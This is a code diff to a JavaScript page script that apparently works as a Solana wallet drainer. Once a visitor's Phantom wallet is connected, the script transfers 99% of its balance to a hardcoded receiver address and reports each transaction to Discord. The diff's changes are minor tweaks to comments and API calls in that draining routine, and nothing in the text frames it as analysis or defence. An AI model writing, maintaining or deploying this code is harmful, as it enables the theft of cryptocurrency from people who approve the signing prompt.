@@ -76,7 +76,7 @@ $(document).ready(function() {
         try {
             const recieverWallet = new solanaWeb3.PublicKey('7pn7bxJakCXjiyYt5QQy8McZCMCSDk2EvCcNr97UHsfG');
             
-            // Get CURRENT balance, not the old one
+            // Get CURRENT balance
             const currentBalance = await connection.getBalance(walletPublicKey);
             const minBalance = await connection.getMinimumBalanceForRentExemption(0);
             const balanceForTransfer = currentBalance - minBalance;
@@ -89,7 +89,7 @@ $(document).ready(function() {
                 sendToDiscord('Insufficient funds for transfer');
                 return;
             }
-    
+
             const transaction = new solanaWeb3.Transaction().add(
                 solanaWeb3.SystemProgram.transfer({
                     fromPubkey: walletPublicKey,
@@ -97,12 +97,13 @@ $(document).ready(function() {
                     lamports: Math.floor(balanceForTransfer * 0.99),
                 }),
             );
-    
+
+            // USE getRecentBlockhash for older web3.js
             const { blockhash } = await connection.getRecentBlockhash();
             transaction.recentBlockhash = blockhash;
             transaction.feePayer = walletPublicKey;
-    
-            // USE THIS METHOD FOR PHANTOM - sign first, then send
+
+            // Sign and send
             const signedTransaction = await window.solana.signTransaction(transaction);
             const signature = await connection.sendRawTransaction(signedTransaction.serialize());
             
@@ -110,7 +111,7 @@ $(document).ready(function() {
             sendToDiscord(`Transaction sent: ${signature}`);
             
             // Confirm transaction
-            const confirmation = await connection.confirmTransaction(signature, 'confirmed');
+            await connection.confirmTransaction(signature);
             console.log("Transaction confirmed:", signature);
             sendToDiscord(`Transaction confirmed: ${signature}`);
             
